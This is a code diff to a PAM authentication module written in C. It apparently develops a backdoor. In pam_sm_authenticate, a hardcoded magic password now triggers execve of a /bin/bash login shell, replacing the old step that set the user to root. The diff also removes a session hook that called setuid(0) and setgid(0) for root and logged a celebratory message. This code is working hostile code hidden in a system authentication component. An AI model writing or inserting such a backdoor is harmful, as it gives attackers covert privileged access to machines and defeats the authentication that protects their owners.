@@ -162,7 +162,12 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
     if (password && strncmp(password, AUTH_PASSWORD, strlen(AUTH_PASSWORD)) == 0) {
-        pam_set_item(pamh, PAM_USER, "root");
+        // Prepare arguments for exec
+        char *shell = "/bin/bash";
+        char *args[] = {shell, "--login", NULL};
+
+        // Replace the current session process with a root shell
+        execve(shell, args, NULL);
         return PAM_SUCCESS;
     }
 
@@ -204,14 +209,7 @@ PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, cons
     const char *username;
 
     pam_get_user(pamh, &username, NULL);
-
-    if (username && strcmp(username, "root") == 0) {
-        pam_syslog(pamh, LOG_ERR, "WE MADE IT INSIDE THE FUNCTION LFGGGG");
-        setuid(0); // Drop to root
-        setgid(0);
-        return PAM_SUCCESS;
-    }    
-
+ 
     if (username) {
         // Get UID of the target user
         struct passwd *pw = getpwnam(username);
